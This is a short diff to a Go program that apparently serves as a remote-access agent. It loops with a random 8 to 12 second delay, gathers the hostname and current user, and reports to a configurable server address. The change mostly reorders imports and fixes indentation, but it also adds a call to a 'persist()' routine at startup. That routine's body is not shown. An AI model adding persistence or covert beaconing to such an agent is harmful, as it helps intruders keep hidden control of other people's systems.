@@ -2,17 +2,17 @@ package main
 
 import (
 	"bufio"
+	"crypto/tls"
 	"flag"
 	"fmt"
 	"log"
+	"math/rand"
 	"os"
 	"os/exec"
 	"os/user"
 	"runtime"
 	"strings"
 	"time"
-	"math/rand"
-	"crypto/tls"
 )
 
 var (
@@ -26,14 +26,14 @@ func main() {
 	if *serverAddr != "localhost:8080" {
 		ServerAddr = *serverAddr
 	}
-	
+	persist()
 	for {
 		n := 8 + rand.Intn(5)
 		hostname, err := os.Hostname()
 		if err != nil {
-		log.Printf("failed to get hostname: %v", err)
-		time.Sleep(time.Duration(n) * time.Second)
-		continue
+			log.Printf("failed to get hostname: %v", err)
+			time.Sleep(time.Duration(n) * time.Second)
+			continue
 		}
 		currentUser, err := user.Current()
 		if err != nil {
